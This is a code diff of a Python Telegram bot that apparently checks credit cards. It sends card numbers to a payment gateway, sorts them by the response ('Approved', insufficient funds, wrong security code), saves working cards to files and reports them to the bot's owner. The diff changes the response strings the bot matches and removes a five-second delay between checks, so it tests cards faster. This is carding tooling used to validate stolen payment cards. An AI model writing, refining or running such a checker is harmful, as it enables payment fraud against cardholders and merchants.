@@ -95,12 +95,12 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				
 				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
 
-				if "Thank" in last:
+				if "Approved" in last:
 				    with open("thank_cards.txt", "a") as thank_file:
 				        thank_file.write(card_info + "\n")
 				    bot.send_message(owner_id, f"✅ Thank Result Found:\n💳 Card: {cc.strip()}")
 
-				elif "insufficient funds" in last:
+				elif "Not sufficient funds" in last:
 				    with open("insufficient_cards.txt", "a") as insufficient_file:
  				       insufficient_file.write(card_info + "\n")
 				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n💳 Card: {cc.strip()}")
@@ -111,7 +111,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 #Hit_Sender
 				
 				print(last)
-				if 'Thank' in last:
+				if 'Approved' in last:
 					ch += 1
 					bot.reply_to(message, msg)
 					
@@ -121,7 +121,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				elif 'security code is incorrect' in last or 'security code is invalid' in last:
 					ccn += 1
 					
-				elif 'insufficient funds' in last:
+				elif 'Not sufficient funds' in last:
 					msg = f'''			
 𝐂𝐀𝐑𝐃: <code>{cc}</code>
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>INSUFFICIENT FUNDS 🔥</code>
@@ -140,7 +140,6 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				    	
 				else:
 					dd += 1
-					time.sleep(5)
 	except Exception as e:
 		print(e)
 	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='CHECKED ✅\nBOT BY ➜ @strawhatchannel96')
